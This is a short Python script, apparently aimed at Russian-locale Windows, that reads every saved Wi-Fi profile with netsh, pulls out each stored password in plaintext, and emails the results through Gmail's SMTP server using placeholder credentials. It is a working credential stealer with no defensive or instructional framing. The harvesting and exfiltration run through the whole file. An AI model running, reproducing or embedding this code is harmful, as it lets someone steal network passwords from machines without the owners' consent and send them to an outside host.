import subprocess, smtplib, re

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell = True).decode('cp866')
print(networks)
netword_names_list = re.findall("(?:Все профили пользователей\s*:\s)(.*)", networks)

result = ""
for netword_name in  netword_names_list:
    command = "netsh wlan show profile " + netword_name + " key=clear"
    current_result = subprocess.check_output(command, shell=True).decode('cp866')
    result += current_result
    print(result)

send_mail("mail@mail.com", "password", result.encode('utf-8'))